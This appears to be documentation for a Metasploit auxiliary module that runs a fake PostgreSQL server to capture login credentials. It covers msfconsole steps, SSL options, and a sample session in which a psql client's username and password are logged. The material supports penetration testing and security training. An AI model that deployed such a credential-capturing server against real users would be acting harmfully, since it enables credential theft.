This module creates a mock PostgreSQL server which accepts credentials.  Upon receiving a login attempt, a
`FATAL:  password authentication failed for user` error is thrown.

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/server/capture/postgresql```
  3. Do: ```run```

## Options

  **SSL**

  Boolean if SSL should be used.  Default is `False`.

  **SSLCert**

  File path to a combined Private Key and Certificate file.  If not provided, a certificate will be automatically
  generated.  Default is null.

## Scenarios

### PostgreSQL Server and psql Client

Server:

```
msf5 > use auxiliary/server/capture/postgresql 
msf5 auxiliary(server/capture/postgresql) > run
[*] Auxiliary module running as background job 0.

[*] Started service listener on 0.0.0.0:5432 
[*] Server started.
[+] PostgreSQL LOGIN 127.0.0.1:49882 msf / pwn_all_da_tings / msf
```

Client:

```
root@kali:~# psql -U msf -h 127.0.0.1
Password for user msf: 
psql: FATAL:  password authentication failed for user "msf"
```
